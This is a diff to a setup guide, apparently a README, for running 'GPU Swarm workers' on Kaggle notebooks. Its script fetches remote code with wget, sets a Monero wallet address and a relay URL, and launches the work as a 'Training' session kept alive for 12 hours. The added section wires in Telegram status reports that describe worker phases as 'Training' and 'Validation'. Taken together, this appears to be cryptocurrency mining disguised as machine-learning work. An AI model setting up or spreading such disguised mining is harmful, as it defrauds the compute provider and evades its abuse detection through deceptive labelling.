@@ -32,12 +32,27 @@ subprocess.run(["wget", "-q", "https://raw.githubusercontent.com/naia231/naira/m
 os.environ['XMR_WALLET'] = "45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa"
 os.environ['RELAY_URL'] = "wss://your-relay-url.onrender.com"
 
+# Optional: Telegram Status Reports
+os.environ['TELEGRAM_BOT_TOKEN'] = "YOUR_BOT_TOKEN"
+os.environ['TELEGRAM_CHAT_ID'] = "YOUR_CHAT_ID"
+
 # 3. Launch the "Training" session
 print("[*] Starting Training Loop...")
 subprocess.run(["python", "train.py"])
 ```
 
 5.  **Keep the tab open** or use a "Keep-Alive" browser extension. Kaggle will run for 12 hours.
+
+---
+
+## 3. Telegram Status Reporting (Optional)
+
+To monitor all your GPU Swarm workers from one place:
+1. Open Telegram and search for **BotFather**.
+2. Send `/newbot` and follow the steps to get your **Bot Token**.
+3. Send a message to your new bot.
+4. Go to `https://api.telegram.org/bot<YourBOTToken>/getUpdates` to find your **Chat ID** (look for `"chat":{"id":123456789}`).
+5. Add the Token and Chat ID to the Python script above. Your bot will message you every time a worker shifts between "Training" and "Validation" phases.
 
 ---
 
